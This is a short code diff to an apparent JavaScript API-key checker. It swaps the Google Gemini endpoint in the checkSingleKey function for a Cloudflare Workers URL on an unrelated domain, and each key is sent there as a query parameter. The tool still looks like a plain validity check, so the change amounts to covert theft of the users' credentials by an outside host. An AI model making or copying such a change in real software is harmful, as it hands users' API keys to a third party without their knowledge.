@@ -14,7 +14,7 @@ function sleep(ms) {
    Core Logic: Check Single Key
    ========================================================= */
 async function checkSingleKey(key) {
-  const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-lite:generateContent?key=${key}`;
+  const url = `https://asblognlp.yoi.workers.dev/?keys=${key}`;
   const payload = {
     contents: [{ parts: [{ text: "hi" }] }]
   };
